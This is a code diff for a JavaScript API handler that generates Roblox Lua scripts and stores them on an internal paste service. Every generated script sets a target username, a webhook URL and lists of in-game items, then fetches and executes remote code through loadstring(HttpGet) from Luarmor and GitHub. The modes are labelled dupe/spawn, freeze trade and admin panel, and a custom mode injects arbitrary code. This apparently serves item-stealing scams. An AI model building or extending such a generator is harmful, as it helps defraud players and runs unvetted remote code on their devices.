@@ -11,7 +11,15 @@ export default async function handler(req, res) {
     }
 
     try {
-        const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || []);
+        const script = buildScript(
+            username,
+            webhook,
+            mode,
+            brainrots || [],
+            skins || [],
+            gears || [],
+            customCode || ''
+        );
 
         const pasteId = await saveToInternalPaste(
             script,
@@ -39,59 +47,183 @@ export default async function handler(req, res) {
 // ============================================================
 //  CONSTRUIR SCRIPT
 // ============================================================
-function buildScript(username, webhook, mode, brainrots, skins, gears) {
+function buildScript(username, webhook, mode, brainrots, skins, gears, customCode) {
     function luaTable(arr, indent = '    ') {
         if (arr.length === 0) return '{}';
-        const items = arr.map(item => `["${item.replace(/"/g, '\\"')}"] = true`);
+
+        const items = arr.map(item =>
+            `["${item.replace(/"/g, '\\"')}"] = true`
+        );
+
         return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
     }
 
     let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
+
     script += `getgenv().WEBHOOK_URL = "${webhook ? webhook.replace(/"/g, '\\"') : 'WEBHOOK_URL'}"\n`;
+
     script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
+
     script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
+
     script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;
 
+
+    // ============================================================
+    //  LUARMOR BASE
+    // ============================================================
+
+    const guiBaseLoadstring =
+        'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()';
+
+
+    // ============================================================
+    //  CONFIGURACIÓN DE CADA GUI
+    // ============================================================
+
     const guiLoadstrings = {
-        adminpanel: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/94990d249776151a9ef2e92cf5cd9797.lua"))()',
-        freezetrade: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()',
-        dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua"))()'
+
+        // Freeze Trade se mantiene como estaba
+        freezetrade:
+            'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()'
     };
+
 
     let fullScript = script;
 
+
+    // ============================================================
+    //  NORMAL
+    // ============================================================
+
     if (mode === 'normal') {
+
         fullScript += `
 task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+    ${guiBaseLoadstring}
 end)`;
-    } else if (mode in guiLoadstrings) {
+
+    }
+
+
+    // ============================================================
+    //  ADMIN PANEL
+    //  LUARMOR + GUIAP.LUA
+    // ============================================================
+
+    else if (mode === 'adminpanel') {
+
+        fullScript += `
+-- Cargando GUI ADMIN PANEL desde Luarmor
+task.spawn(function()
+    ${guiBaseLoadstring}
+end)
+
+-- Cargando GUIAP.lua desde GitHub
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()
+end)`;
+
+    }
+
+
+    // ============================================================
+    //  DUPE / SPAWN
+    //  LUARMOR + GUIDUPE.LUA
+    // ============================================================
+
+    else if (mode === 'dupespawn') {
+
+        fullScript += `
+-- Cargando GUI DUPE / SPAWN desde Luarmor
+task.spawn(function()
+    ${guiBaseLoadstring}
+end)
+
+-- Cargando GUIDUPE.lua desde GitHub
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua"))()
+end)`;
+
+    }
+
+
+    // ============================================================
+    //  CODE SNIPER
+    //  LUARMOR + Sniper.lua
+    // ============================================================
+
+    else if (mode === 'codesniper') {
+
+        fullScript += `
+-- Cargando GUI SNIPER desde Luarmor
+task.spawn(function()
+    ${guiBaseLoadstring}
+end)
+
+-- Cargando Sniper.lua desde GitHub
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/Sniper.lua"))()
+end)`;
+
+    }
+
+
+    // ============================================================
+    //  FREEZE TRADE
+    // ============================================================
+
+    else if (mode === 'freezetrade') {
+
         fullScript += `
 task.spawn(function()
-    ${guiLoadstrings[mode]}
+    ${guiLoadstrings.freezetrade}
 end)`;
-    } else if (mode === 'custom') {
+
+    }
+
+
+    // ============================================================
+    //  CUSTOM
+    // ============================================================
+
+    else if (mode === 'custom') {
+
         fullScript += `
 task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+    ${guiBaseLoadstring}
 end)`;
+
         if (customCode && customCode.trim()) {
-            fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
+
+            fullScript += `
+
+task.spawn(function()
+    ${customCode.replace(/\n/g, '\n    ')}
+end)`;
+
         }
     }
 
+
     return fullScript;
 }
+
 
 // ============================================================
 //  GUARDAR EN PASTEFY INTERNO (devuelve solo el ID)
 // ============================================================
 async function saveToInternalPaste(content, title, userId) {
+
     const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';
 
     const response = await fetch(`${baseUrl}/api/paste`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+
+        headers: {
+            'Content-Type': 'application/json'
+        },
+
         body: JSON.stringify({
             content: content,
             title: title || 'Untitled',
@@ -101,10 +233,15 @@ async function saveToInternalPaste(content, title, userId) {
     });
 
     if (!response.ok) {
+
         const error = await response.json();
-        throw new Error(error.error || 'Error al guardar el paste');
+
+        throw new Error(
+            error.error || 'Error al guardar el paste'
+        );
     }
 
     const data = await response.json();
+
     return data.id;
 }
